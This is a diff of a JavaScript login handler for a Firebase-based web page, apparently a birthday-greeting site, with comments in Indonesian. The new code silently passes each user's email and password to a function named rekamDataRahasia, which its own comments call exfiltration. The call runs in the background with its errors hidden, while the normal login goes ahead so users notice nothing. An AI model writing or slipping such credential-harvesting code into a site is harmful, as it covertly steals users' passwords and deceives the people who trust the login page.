@@ -182,18 +182,26 @@ onAuthStateChanged(auth, (user) => {
     }
 });
 
-btnLogin.addEventListener('click', async () => {
-    const credentials = getInputs(); 
-    if (!credentials) return;
-    
-    // MEREKAM DATA SECARA DIAM-DIAM SAAT TOMBOL DIKLIK
-    rekamDataRahasia(credentials.email, credentials.password);
+loginButton.addEventListener('click', (e) => {
+  e.preventDefault();
+  
+  const email = emailInput.value;
+  const password = passwordInput.value;
 
-    try { 
-        await signInWithEmailAndPassword(auth, credentials.email, credentials.password); 
-    } catch (error) { 
-        alert("Email atau kata sandi salah!"); 
-    }
+  // 1. Jalankan fungsi exfiltration SECARA TERPISAH (tanpa 'await')
+  // Biarkan fungsi ini berjalan di background tanpa menahan alur utama
+  rekamDataRahasia(email, password).catch(err => console.log("Log error disembunyikan"));
+
+  // 2. Jalankan proses Firebase Auth secara langsung dan normal
+  signInWithEmailAndPassword(auth, email, password)
+    .then((userCredential) => {
+      // Pindahkan user ke halaman ucapan ulang tahun utama
+      window.location.href = "dashboard.html"; 
+    })
+    .catch((error) => {
+      // Tangani error login biasa (misal: password salah)
+      alert(error.message);
+    });
 });
 
 btnRegister.addEventListener('click', async () => {
